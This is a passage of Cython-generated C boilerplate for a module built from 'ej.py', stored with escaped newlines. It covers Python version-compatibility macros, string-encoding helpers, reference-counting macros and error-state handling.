PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\n#else\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n  #define __Pyx_PySequence_ListKeepNew(obj)\\\n    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))\n#else\n  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_ITEM(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) (PyTuple_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyList_SET_ITEM(o, i, v) (PyList_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_GET_SIZE(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_GET_SIZE(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_GET_SIZE(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_GET_SIZE(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_GET_SIZE(o)\n#else\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_GetItem(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) PyTuple_SetItem(o, i, v)\n  #define __Pyx_PyList_SET_ITEM(o, i, v) PyList_SetItem(o, i, v)\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_Size(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_Size(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_Size(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_Size(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_Size(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyIntObject                  PyLongObject\n  #define PyInt_Type                   PyLong_Type\n  #define PyInt_Check(op)              PyLong_Check(op)\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\n  #define __Pyx_Py3Int_Check(op)       PyLong_Check(op)\n  #define __Pyx_Py3Int_CheckExact(op)  PyLong_CheckExact(op)\n  #define PyInt_FromString             PyLong_FromString\n  #define PyInt_FromUnicode            PyLong_FromUnicode\n  #define PyInt_FromLong               PyLong_FromLong\n  #define PyInt_FromSize_t             PyLong_FromSize_t\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\n  #define PyInt_AsLong                 PyLong_AsLong\n  #define PyInt_AS_LONG                PyLong_AS_LONG\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\n  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\n  #define PyNumber_Int                 PyNumber_Long\n#else\n  #define __Pyx_Py3Int_Check(op)       (PyLong_Check(op) || PyInt_Check(op))\n  #define __Pyx_Py3Int_CheckExact(op)  (PyLong_CheckExact(op) || PyInt_CheckExact(op))\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBoolObject                 PyLongObject\n#endif\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\n  #ifndef PyUnicode_InternFromString\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n  #endif\n#endif\n#if PY_VERSION_HEX < 0x030200A4\n  typedef long Py_hash_t;\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\n#else\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#endif\n#if CYTHON_USE_ASYNC_SLOTS\n  #if PY_VERSION_HEX >= 0x030500B1\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\n  #else\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\n  #endif\n#else\n  #define __Pyx_PyType_AsAsync(obj) NULL\n#endif\n#ifndef __Pyx_PyAsyncMethodsStruct\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n    } __Pyx_PyAsyncMethodsStruct;\n#endif\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #if !defined(_USE_MATH_DEFINES)\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#define __PYX_MARK_ERR_POS(f_index, lineno) \\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifdef CYTHON_EXTERN_C\n    #undef __PYX_EXTERN_C\n    #define __PYX_EXTERN_C CYTHON_EXTERN_C\n#elif defined(__PYX_EXTERN_C)\n    #ifdef _MSC_VER\n    #pragma message ("Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.")\n    #else\n    #warning Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.\n    #endif\n#else\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern "C"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__ej\n#define __PYX_HAVE_API__ej\n/* Early includes */\n#ifdef _OPENMP\n#include <omp.h>\n#endif /* _OPENMP */\n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\n#define __PYX_DEFAULT_STRING_ENCODING ""\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char*);\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if PY_MAJOR_VERSION < 3\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#else\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\n#endif\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const wchar_t *u)\n{\n    const wchar_t *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#else\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u)\n{\n    const Py_UNICODE *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#endif\n#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#else\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#endif\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\n#if PY_MAJOR_VERSION >= 3\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#else\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\n#endif\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_VERSION_HEX >= 0x030C00A7\n  #ifndef _PyLong_SIGN_MASK\n    #define _PyLong_SIGN_MASK 3\n  #endif\n  #ifndef _PyLong_NON_SIZE_BITS\n    #define _PyLong_NON_SIZE_BITS 3\n  #endif\n  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)\n  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))\n  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)\n  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))\n  #define __Pyx_PyLong_SignedDigitCount(x)\\\n        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))\n  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)\n    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)\n    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)\n  #else\n    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))\n    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])\n  #endif\n  typedef Py_ssize_t  __Pyx_compact_pylong;\n  typedef size_t  __Pyx_compact_upylong;\n  #else  // Py < 3.12\n  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)\n  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)\n  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))\n  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)\n  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)\n  #define __Pyx_PyLong_CompactValue(x)\\\n        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))\n  typedef sdigit  __Pyx_compact_pylong;\n  typedef digit  __Pyx_compact_upylong;\n  #endif\n  #if PY_VERSION_HEX >= 0x030C00A5\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)\n  #else\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)\n  #endif\n#endif\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n#include <string.h>\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    PyObject* ascii_chars_u = NULL;\n    PyObject* ascii_chars_b = NULL;\n    const char* default_encoding_c;\n    sys = PyImport_ImportModule("sys");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    if (strcmp(default_encoding_c, "ascii") == 0) {\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\n    } else {\n        char ascii_chars[128];\n        int c;\n        for (c = 0; c < 128; c++) {\n            ascii_chars[c] = (char) c;\n        }\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\n        if (!ascii_chars_u) goto bad;\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\n            PyErr_Format(\n                PyExc_ValueError,\n                "This module compiled with c_string_encoding=ascii, but default encoding \'%.200s\' is not a superset of ascii.",\n                default_encoding_c);\n            goto bad;\n        }\n        Py_DECREF(ascii_chars_u);\n        Py_DECREF(ascii_chars_b);\n    }\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    Py_XDECREF(ascii_chars_u);\n    Py_XDECREF(ascii_chars_b);\n    return -1;\n}\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#else\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#include <string.h>\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    char* default_encoding_c;\n    sys = PyImport_ImportModule("sys");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    return -1;\n}\n#endif\n#endif\n\n\n/* Test for GCC > 2.95 */\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else /* !__GNUC__ or GCC < 2.95 */\n  #define likely(x)   (x)\n  #define unlikely(x) (x)\n#endif /* __GNUC__ */\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n\n#if !CYTHON_USE_MODULE_STATE\nstatic PyObject *__pyx_m = NULL;\n#endif\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * __pyx_cfilenm = __FILE__;\nstatic const char *__pyx_filename;\n\n/* #### Code section: filename_table ### */\n\nstatic const char *__pyx_f[] = {\n  "ej.py",\n};\n/* #### Code section: utility_code_proto_before_types ### */\n/* ForceInitThreads.proto */\n#ifndef __PYX_FORCE_INIT_THREADS\n  #define __PYX_FORCE_INIT_THREADS 0\n#endif\n\n/* #### Code section: numeric_typedefs ### */\n/* #### Code section: complex_type_declarations ### */\n/* #### Code section: type_declarations ### */\n\n/*--- Type declarations ---*/\n/* #### Code section: utility_code_proto ### */\n\n/* --- Runtime support code (head) --- */\n/* Refnanny.proto */\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, Py_ssize_t);\n    void (*DECREF)(void*, PyObject*, Py_ssize_t);\n    void (*GOTREF)(void*, PyObject*, Py_ssize_t);\n    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);\n    void* (*SetupContext)(const char*, Py_ssize_t, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n#ifdef WITH_THREAD\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n          }\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n#else\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__))\n  #define __Pyx_RefNannyFinishContextNogil() __Pyx_RefNannyFinishContext()\n#endif\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContextNogil()\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_Py_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; Py_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n/* PyErrExceptionMatches.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);\n#else\n#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)\n#endif\n\n/* PyThreadStateGet.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#if PY_VERSION_HEX >= 0x030C00A6\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)\n#else\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)\n#endif\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()\n#endif\n\n/* PyErrFetchRestore.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)  